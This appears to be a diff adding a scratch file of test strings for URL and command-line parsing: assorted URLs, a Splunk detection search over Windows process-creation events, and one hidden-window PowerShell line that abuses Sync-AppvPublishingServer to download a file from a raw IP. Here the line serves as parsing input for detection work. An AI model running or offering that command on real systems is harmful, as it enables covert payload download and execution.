@@ -1,0 +1,44 @@
+http://www.cool.com:81/index.html
+
+https://regex101.com/
+
+https://github.com/ezalos.top/Rhinoforcement/tree/Deeplearning
+https://github.com/ezalos/Rhinoforcement/tree/Deeplearning.louis.git.dea
+
+http://google.com/lololo
+http://Jojo:lApIn@www.exemple.com:8888/chemin/d/acc%C3%A8s.php?q=req&q2=req2#signet
+
+	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -Command &amp;{$env:psmodulepath = [IO.Directory]::GetCurrentDirectory(); import-module AppvClient; Sync-AppvPublishingServer  \n;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;Invoke-WebRequest -Uri http://209.97.141.246/ee/index_files/alert.css}
+http://foo.bar.com
+http://goo.gl
+https://foo.com
+https://www.foo.com
+https://www.foo.com/
+https://www.foo.com/bar
+
+C:\Program Files (x86)\blp\Wintrv\webview\ApiVersions\2020.5.5.2\x64\blpwebview.exe
+
+http://goo.gl/1   http://goo.gl/2
+
+foo (http://goo.gl/1) http://goo.gl/(2)
+http://foo.com/. http://foo.com/! http://foo.com/,
+This url does not have a protocol: goo.gl/1
+http://firstround.com/review/thoughts-on-gender-and-radical-candor/ct=t(How_Does_Your_Leadership_Team_Rate_12_3_2015)
+https://google.com
+
+https:google.com
+
+www.cool.com.au
+
+http://www.cool.com.au
+
+http://www.cool.com.au/ersdfs
+
+http://www.cool.com.au/ersdfs?dfd=dfgd@s=1
+
+http://www.cool.com:81/index.html
+
+https://splunk.soc.intranatixis.com/fr-FR/app/Splunk_ML_Toolkit/search?q=search%20index%3Dmyc_os_win_srv%0AOR%20(splunk_server_group%3Dgom_emea%20index%3Dos_win_wks%20OR%20index%3Dos_win_srv)%20(source%3DXmlWinEventLog%3ASecurity%20OR%20source%3DWinEventLog%3ASecurity)%20(EventCode%3D4688)%20CommandLine%3D*%0A%20%0A%7C%20eval%20comment%3D%20%22LIST%20OF%20FEATURES%20%3A%20%20%20%20%20%20%20%20%20%20NewProcessName%2C%20ParentProcessName%2C%20CommandLine%2C%22%0A%0A%7C%20eval%20comment%3D%20%22.....................................COMMAND%20LINE.....................................%22%0A%7C%20eval%20comment%3D%20%22%20%20%20%20%20%20%20REGEX%20CUT%20%20%20%20%20%20%20%22%0A%7C%20eval%20CMD_len%20%3Dlen(CommandLine)%0A%7C%20rex%20field%3DCommandLine%20%20%20%22(%3F%3CVANILLA_CMD%3E(%3F%23%20WHITESPACE%20ARGS%5C%0A%09)(%3F%3Ccmd%3E(%3F%23whole%20repeat%20pattern)(%3F%23%5C%0A%09)(%3F%3A(%3F%23%5C%0A%09%09)(%3F!(%3F%3Cend_cmd%3E%3B%7C%5C%5C%7C%7C%26%26%7C%26%7C%24))(%3F%23%5C%0A%09%09)(%3F%3Crecur%3E(%3F%23%5C%0A%09%09%09)(%3F%3CBQUOTE_CMD%3E(%3F%23%20WHITESPACE%20ARGS%5C%0A%09%09%09%09)(%3F%3Cstart_bquote%3E%5C%60)(%3F%23%5C%0A%09%09%09%09)(%3F%3Ccmd_bquote%3E(%3F%23whole%20repeat%20pattern)(%3F%23%5C%0A%09%09%09%09)(%3F%3A(%3F%23%5C%0A%09%09%09%09%09)(%3F!%5C%60)(%3F%23%5C%0A%09%09%09%09%09)((%3FP%3EQUOTE_STRING)%7C(%3FP%3EDBQUOTE_STRING))*(%3F%23%5C%0A%09%09%09%09%09)(%3FP%3Eescape)(%3F%23%5C%0A%09%09%09%09))%2B)(%3F%23%5C%0A%09%09%09%09)(%3F%3Cend_bquote%3E%5C%60)(%3F%23%0A%09%09%09))%7C(%3F%3CQUOTE_STRING%3E(%3F%23%5C%0A%09%09%09%09)(%3F%3Cstart_litteral%3E%5C%27)(%3F%23%5C%0A%09%09%09%09)(%3F%3Clitteral%3E(%3F%23%20whole%20repeat%20pattern)(%3F%23%5C%0A%09%09%09%09)(%3F%3A(%3F%23%5C%0A%09%09%09%09%09)(%3F!%5C%27)(%3F%23%5C%0A%09%09%09%09%09)(%3FP%3Eescape)(%3F%23%5C%0A%09%09%09%09))*)(%3F%23%5C%0A%09%09%09%09)(%3F%3Cend_litteral%3E%5C%27)(%3F%23%5C%0A%09%09%09))%7C(%3F%3CDBQUOTE_STRING%3E(%3F%23%5C%0A%09%09%09%09)(%3F%3Cstart_dlitteral%3E%5C%22)(%3F%23%5C%0A%09%09%09%09)(%3F%3Cdlitteral%3E(%3F%23%20whole%20repeat%20pattern)(%3F%23%5C%0A%09%09%09%09)(%3F%3A(%3F%23%5C%0A%09%09%09%09%09)(%3F!%5C%22)(%3F%23%5C%0A%09%09%09%09%09)(%3FP%3Eescape)(%3F%23%5C%0A%09%09%09%09))*)(%3F%23%5C%0A%09%09%09%09)(%3F%3Cend_dlitteral%3E%5C%22)(%3F%23%5C%0A%09%09%09)))*(%3F%23%5C%0A%09%09)(%3F%3Cescape%3E(%3F(%3F!%5C%5C%5C).%7C.%7B2%7D))(%3F%23%5C%0A%09))%2B)(%3F%23%5C%0A%09)(%3FP%3Eend_cmd)(%3F%23%0A))(%3F%23%20%27%2C%27%20%3D%3D%20%27%5Cs%27%20in%20windows_cmd%2C%20not%20in%20ps%0A)%22%20max_match%3D10%0A%7C%20rex%20field%3Dcmd%20%20%20%22(%3F%23%5C%0A)(%3F%3Carg%3E(%3F%23%5C%0A%09)(%3F%3Carg_quote%3E(%3F%23%5C%0A%09%09)(%3F%3Cstart_arg_q%3E%5C%22%7C%5C%27%7C%5C%60)(%3F%23%5C%0A%09%09)(%3F%3Cin_arg_q%3E(%3F%23%20whole%20repeat%20pattern)(%3F%3A(%3F%23%5C%0A%09%09%09)(%3F!%5C%5C3)(%3F%23end%20condition)(%3F%23%5C%0A%09%09%09)(%3F%3Cescape%3E(%3F(%3F!%5C%5C%5C)%5B%5C%5Cx00-%5C%5CxFF%5D%7C%5B%5C%5Cx00-%5C%5CxFF%5D%7B2%7D)))*(%3F%23backslash%20gestion)(%3F%23%5C%0A%09%09))(%3F%23%5C%0A%09%09)(%3F%3Cend_arg_q%3E%5C%5C3)(%3F%23%5C%0A%09))%7C(%3F%3Carg_whitespace%3E(%3F%23%5C%0A%09%09)(%3F%3Cin_arg_w%3E(%3F%3A(%3F!%5C%5Cs%7C%24%7C(%3FP%3Estart_arg_q))(%3FP%3Eescape))%2B)(%3F%23%5C%0A%09))(%3F%23%5C%0A))%22%20max_match%3D100%0A%7C%20eval%20Sub_arg%20%3D%20mvcount(arg)%0A%7C%20eval%20Sub_cmd%20%3D%20mvcount(cmd)%0A%7C%20eval%20Sub_bqcmd%20%3D%20mvcount(BQUOUTE_STRING)%0A%0A%7C%20eval%20comment%3D%20%22.....................................TABLE.....................................%22%0A%7C%20eval%20comment%3D%20%22%20%7C%20table%20NewProcessName%2C%20ParentProcessName%2C%20CommandLine%2C%20C_Deepness%2C%20C_Path_len%2C%20C_Name_len%2C%20P_Deepness%2C%20P_Path_len%2C%20P_Name_len%2C%20C_P_cmp%2C%20P_exist%2C%20C_equal_P%2C%20CMD_exist%2C%20CMD_len%2C%20CMD_1st_arg_len%2C%20CMD_count_space%2C%20CMD_count_equal%2C%20CMD_count_dollar%2C%20CMD_count_quote%2C%20CMD_count_dbquote%2C%20CMD_count_slash%2C%20CMD_count_bslash%2C%20CMD_count_dash%2C%20CMD_count_underscore%2C%20CMD_count_pipe%2C%20CMD_count_semicolon%2C%20CMD_count_paranthesis%2C%20CMD_count_bracket%2C%20CMD_count_curlyb%2C%20CMD_count_star%2C%20C_is_cmd%2C%20P_is_cmd%2C%20mitre_1%2C%20mitre_2%2C%20C_in_tmp%2C%20C_in_dl%2C%20C_in_sys32%2C%20C_in_prgrm%2C%20P_in_tmp%2C%20P_in_dl%2C%20P_in_sys32%2C%20P_in_prgrm%2C%20Secu_Listener%2C%20C_H%2C%20C_Ext_N%2C%20C_Disk_N%2C%20P_H%2C%20P_Ext_N%2C%20P_Disk_N%2C%20C_H%2C%20C_Ext_N%2C%20C_Disk_N%2C%20P_H%2C%20P_Ext_N%2C%20P_Disk_N%2C%20T_Epoch%2C%20T_Sec%2C%20T_Min%2C%20T_Hour%2C%20T_WkDay%2C%20T_Day%2C%20T_Month%2C%20T_Year%22%0A%0A%7C%20table%20CommandLine%2C%20CMD_len%2C%20cmd%2C%20Sub_cmd%2C%20BQUOUTE_STRING%2C%20Sub_bqcmd%2C%20arg%2C%20Sub_arg&sid=1587114320.6877588_AC1BE372-789C-4DAC-BF7B-8D899EAF58A2&display.page.search.mode=fast&dispatch.sample_ratio=1&earliest=-24h&latest=now&display.page.search.tab=statistics&display.general.type=statistics
+
+https://www.google.com/maps/@44.4222592,4.99745,14z
+https://www.google.com/maps/@44.4473731,4.9992384,21z
